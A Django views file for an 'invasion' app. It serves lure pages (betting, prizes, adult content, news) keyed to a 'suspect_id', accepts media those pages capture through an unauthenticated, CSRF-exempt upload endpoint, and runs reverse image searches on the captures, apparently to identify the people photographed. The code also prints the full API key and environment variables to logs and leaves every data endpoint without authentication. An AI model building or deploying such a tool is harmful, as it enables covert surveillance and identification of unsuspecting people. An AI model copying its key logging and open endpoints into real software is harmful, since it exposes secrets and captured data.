from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.views import View
from rest_framework import generics, permissions
from rest_framework.decorators import api_view, permission_classes, parser_classes
from rest_framework.parsers import MultiPartParser, FormParser
from rest_framework.response import Response
from rest_framework import status
from rest_framework.views import APIView
from .models import IntrusionSession, CapturedMedia, IntrusionLog
from .serializers import IntrusionSessionSerializer, CapturedMediaSerializer, IntrusionLogSerializer

import requests
from django.conf import settings
import json
import os
def invasion_page(request):
    """
    Render the default invasion page.
    """
    # Get suspect ID from URL parameter
    suspect_id = request.GET.get('suspect_id', '1')
    return render(request, 'invasao/invasion_page.html', {'suspect_id': suspect_id})

def football_template(request):
    """
    Render the football betting template.
    """
    # Get suspect ID from URL parameter
    suspect_id = request.GET.get('suspect_id', '1')
    return render(request, 'invasao/templates/football.html', {'suspect_id': suspect_id})

def prizes_template(request):
    """
    Render the prizes/offers template.
    """
    # Get suspect ID from URL parameter
    suspect_id = request.GET.get('suspect_id', '1')
    return render(request, 'invasao/templates/prizes.html', {'suspect_id': suspect_id})

def adult_template(request):
    """
    Render the adult content template.
    """
    # Get suspect ID from URL parameter
    suspect_id = request.GET.get('suspect_id', '1')
    return render(request, 'invasao/templates/adult.html', {'suspect_id': suspect_id})

def news_template(request):
    """
    Render the news template.
    """
    # Get suspect ID from URL parameter
    suspect_id = request.GET.get('suspect_id', '1')
    return render(request, 'invasao/templates/news.html', {'suspect_id': suspect_id})

@method_decorator(csrf_exempt, name='dispatch')
class PublicMediaUploadView(APIView):
    """
    Public endpoint for uploading media captured by the invasion page.
    This endpoint does not require authentication.
    """
    permission_classes = []  # Remove all permission classes
    authentication_classes = []  # Remove all authentication classes
    parser_classes = [MultiPartParser, FormParser]
    
    def post(self, request):
        # Log all headers for debugging
        print("All headers received:")
        for header, value in request.META.items():
            if header.startswith('HTTP_'):
                print(f"  {header}: {value}")
        
        # Get or create a session based on a unique identifier from the request
        # This could be a custom header or a parameter
        session_identifier = request.META.get('HTTP_X_SUSPECT_ID', 'default')
        
        # Also check for suspect_id in query parameters as fallback
        if session_identifier == 'default':
            session_identifier = request.GET.get('suspect_id', 'default')
        
        # Log the received suspect ID for debugging
        print(f"Received suspect ID: {session_identifier}")
        
        # Create a session specific to this suspect
        session, created = IntrusionSession.objects.get_or_create(
            title=f"Suspect {session_identifier} Session",
            defaults={
                "description": f"Session created for suspect {session_identifier}",
                "target_device": request.META.get('HTTP_USER_AGENT', 'Unknown Device'),
                "created_by": None  # No user for public sessions
            }
        )
        
        # Log the session info
        print(f"Using session ID: {session.id}, Title: {session.title}")
        
        # Add session ID to the request data
        request_data = request.data.copy()
        request_data['session'] = session.id
        
        # Try to get file size if available
        file_size = None
        if 'file' in request.FILES:
            file_size = request.FILES['file'].size
        
        request_data['file_size'] = file_size
        
        serializer = CapturedMediaSerializer(data=request_data)
        if serializer.is_valid():
            saved_media = serializer.save()
            print(f"Saved media with ID: {saved_media.id}, Session ID: {saved_media.session.id}")
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        else:
            print(f"Serializer errors: {serializer.errors}")
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

@api_view(['GET'])
@permission_classes([])  # No authentication required
def get_captures_by_suspect(request):
    """
    Get all captures, optionally filtered by suspect/session.
    """
    suspect_id = request.GET.get('suspect_id', None)
    
    # Log the received suspect ID
    print(f"Fetching captures for suspect_id: {suspect_id}")
    
    if suspect_id:
        # Filter by session title which contains the suspect ID
        captures = CapturedMedia.objects.filter(session__title__icontains=f"Suspect {suspect_id}").order_by('-timestamp')
        print(f"Found {captures.count()} captures for suspect_id: {suspect_id}")
    else:
        captures = CapturedMedia.objects.all().order_by('-timestamp')
        print(f"Found {captures.count()} total captures")
    
    # Serialize the captures
    serialized_captures = []
    for capture in captures:
        serialized_captures.append({
            'id': capture.id,
            'suspectId': capture.session.id,
            'suspectName': capture.session.title,
            'imageUrl': request.build_absolute_uri(capture.file.url) if capture.file else '',
            'timestamp': capture.timestamp.strftime('%H:%M:%S'),
            'fileType': capture.media_type
        })
    
    print(f"Returning {len(serialized_captures)} serialized captures")
    return Response(serialized_captures)

@api_view(['GET'])
@permission_classes([])  # No authentication required
def get_sessions(request):
    """
    Get all sessions for debugging purposes.
    """
    sessions = IntrusionSession.objects.all()
    serialized_sessions = []
    for session in sessions:
        serialized_sessions.append({
            'id': session.id,
            'title': session.title,
            'description': session.description,
            'media_count': session.captured_media.count()
        })
    
    return Response(serialized_sessions)

@api_view(['POST'])
@permission_classes([])  # No authentication required
def search_similar_images(request):
    """
    Search for similar images using SerpAPI (Google Images search)
    """
    try:
        # Get the image URL from the request
        image_url = request.data.get('imageUrl')
        print(f"Received image URL: {image_url}")  # Debug logging
        
        if not image_url:
            print("ERROR: No image URL provided in request")  # Debug logging
            return Response({'error': 'Image URL is required'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate that the image URL is accessible (but don't fail if validation fails)
        try:
            print(f"Validating image URL accessibility: {image_url}")  # Debug logging
            validation_response = requests.head(image_url, timeout=10)
            print(f"Validation response status: {validation_response.status_code}")  # Debug logging
            if validation_response.status_code >= 400:
                warning_msg = f'Warning: Image URL may not be accessible. Status: {validation_response.status_code}'
                print(f"WARNING: {warning_msg}")  # Debug logging
                # Don't fail here, just log the warning and continue
        except requests.RequestException as e:
            warning_msg = f'Warning: Cannot access image URL: {str(e)}'
            print(f"WARNING: {warning_msg}")  # Debug logging
            # Don't fail here, just log the warning and continue
        
        # SerpAPI configuration
        # Use the SERPAPI_KEY environment variable
        api_key = os.environ.get('SERPAPI_KEY')
        print(f"SerpAPI Key loaded: {api_key}")  # Debug logging
        
        # Additional debugging - check all environment variables
        print("All environment variables containing 'SERP':")
        for key, value in os.environ.items():
            if 'SERP' in key.upper():
                print(f"  {key}: {value}")
        
        api_url = "https://serpapi.com/search"        
        
        # Check if API key is available
        if not api_key:
            print("ERROR: SERPAPI_KEY not found in environment variables")
            # List all environment variables for debugging
            print("Available environment variables:")
            for key in sorted(os.environ.keys()):
                if 'KEY' in key.upper() or 'API' in key.upper() or 'SERP' in key.upper():
                    masked_value = os.environ.get(key)[:5] + "..." if os.environ.get(key) else "None"
                    print(f"  {key}: {masked_value}")  # Show first 5 chars only for security
            return Response({'error': 'SerpAPI key not configured'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        # Check if API key has minimum length (basic validation)
        if len(api_key) < 10:
            print("ERROR: SERPAPI_KEY appears to be invalid (too short)")
            return Response({'error': 'Invalid API key configuration'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        print(f"Using API key (first 5 chars): {api_key[:5]}...")  # Debug logging
        
        # Make request to SerpAPI using image search
        params = {
            "engine": "google",
            "q": "",  # Empty query since we're doing reverse image search
            "google_domain": "google.com",
            "gl": "us",
            "hl": "en",
            "tbm": "isch",  # Image search
            "ijn": "0",
            "api_key": api_key,
            "image_url": image_url  # Reverse image search parameter
        }
        
        print(f"Making GET request to {api_url} with params: {params}")  # Debug logging
        response = requests.get(api_url, params=params, timeout=30)
        print(f"Response status code: {response.status_code}")  # Debug logging
        print(f"Response content: {response.text}")  # Debug logging
        
        # Handle different response status codes
        if response.status_code == 200:
            data = response.json()
            
            # Process the results
            results = []
            if 'images_results' in data:
                for item in data['images_results']:
                    results.append({
                        'source': item.get('source', ''),
                        'thumbnail': item.get('thumbnail', ''),
                        'original': item.get('original', ''),
                        'title': item.get('title', ''),
                        'source_name': item.get('source', '')
                    })
            
            return Response({
                'success': True,
                'results': results,
                'total': len(results),
                'query': image_url
            })
        elif response.status_code == 401:
            # Unauthorized - likely invalid API key
            print("ERROR: Unauthorized access to SerpAPI - possibly invalid API key")
            return Response({
                'error': 'Invalid API key or unauthorized access to image search service'
            }, status=status.HTTP_401_UNAUTHORIZED)
        elif response.status_code == 403:
            # Forbidden - API key valid but no access to this feature
            print("ERROR: Forbidden access to SerpAPI - API key lacks permission for image search")
            return Response({
                'error': 'API key lacks permission for image search service'
            }, status=status.HTTP_403_FORBIDDEN)
        elif response.status_code == 429:
            # Rate limited
            print("ERROR: Rate limited by SerpAPI")
            return Response({
                'error': 'Rate limit exceeded for image search service. Please try again later.'
            }, status=status.HTTP_429_TOO_MANY_REQUESTS)
        elif response.status_code >= 500:
            # Server error
            print(f"ERROR: SerpAPI server error - Status: {response.status_code}")
            return Response({
                'error': f'Image search service temporarily unavailable. Status: {response.status_code}'
            }, status=status.HTTP_502_BAD_GATEWAY)
        else:
            print(f"SerpAPI error - Status: {response.status_code}, Content: {response.text}")
            return Response({
                'error': f'Failed to search similar images. Status: {response.status_code}',
                'details': response.text[:500]  # Include first 500 chars of response for debugging
            }, status=response.status_code)
            
    except requests.Timeout:
        print("ERROR: Timeout while connecting to SerpAPI")
        return Response({
            'error': 'Timeout while connecting to image search service. Please try again.'
        }, status=status.HTTP_504_GATEWAY_TIMEOUT)
    except requests.ConnectionError:
        print("ERROR: Connection error while connecting to SerpAPI")
        return Response({
            'error': 'Connection error while connecting to image search service. Please check network connectivity.'
        }, status=status.HTTP_502_BAD_GATEWAY)
    except Exception as e:
        print(f"Error searching similar images: {str(e)}")
        return Response({'error': f'Internal server error: {str(e)}'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


# Only keeping the endpoints you requested
class IntrusionLogListCreateView(generics.ListCreateAPIView):
    queryset = IntrusionLog.objects.all()
    serializer_class = IntrusionLogSerializer
    # permission_classes = [permissions.IsAuthenticated]

class IntrusionLogRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):
    queryset = IntrusionLog.objects.all()
    serializer_class = IntrusionLogSerializer
    # permission_classes = [permissions.IsAuthenticated]

class CapturedMediaListCreateView(generics.ListCreateAPIView):
    queryset = CapturedMedia.objects.all()
    serializer_class = CapturedMediaSerializer
    # permission_classes = [permissions.IsAuthenticated]

class CapturedMediaRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):
    queryset = CapturedMedia.objects.all()
    serializer_class = CapturedMediaSerializer
    # permission_classes = [permissions.IsAuthenticated]

class IntrusionSessionListCreateView(generics.ListCreateAPIView):
    queryset = IntrusionSession.objects.all()
    serializer_class = IntrusionSessionSerializer
    # permission_classes = [permissions.IsAuthenticated]

class IntrusionSessionRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):
    queryset = IntrusionSession.objects.all()
    serializer_class = IntrusionSessionSerializer
    # permission_classes = [permissions.IsAuthenticated]
